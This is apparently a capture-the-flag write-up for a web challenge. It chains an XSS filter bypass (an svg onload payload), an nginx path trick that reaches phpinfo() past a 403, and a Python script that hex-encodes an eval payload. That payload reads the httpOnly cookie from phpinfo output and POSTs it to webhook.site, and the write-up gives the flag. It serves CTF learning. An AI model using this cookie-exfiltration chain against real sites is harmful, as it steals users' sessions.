---
created: 2024-08-17T18:40
updated: 2024-08-18T21:34
points: 135
solves: 161
---

## problem

- cookie is `httpOnly`, which means its not accessible from js.
- free XSS because the substring part does nothing.

I am able to circumvent the need for spaces and slashes using the following payload.

```html
<svg\x0conload="alert(1)">
```

And I can send web requests from http://idek-hello.chal.idek.team:1337, but there is no cookie.
## phpinfo

`phpinfo()` also displays cookies, and that includes `httpOnly` cookies as well.

That means we can send a request to it and get our flag.

```html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.27.1</center>
</body>
</html>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
```

However we only get a 403, that's weird.

My teammate was able to find the following bypass, tbh idk how it works.

`http://idek-hello.chal.idek.team:1337/info.php/.php`

I do know that this is SSRF using the nginx rule but nginx is weird.

## script

```python
import urllib.parse
payload = """
fetch('http://idek-hello.chal.idek.team:1337/info.php/.php').then(r => r.text()).then(r => {
    fetch("http://webhook.site",{mode:  'no-cors', method: 'POST', body: r})
});
"""


def string_to_hex(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)


payload = urllib.parse.quote_plus(f"<svg\x0conload=\"console.log(1);eval('{string_to_hex(payload)}')\">")
print('http://idek-hello.chal.idek.team:1337/?name='+payload)
```

```flag
idek{Ghazy_N3gm_Elbalad}
```
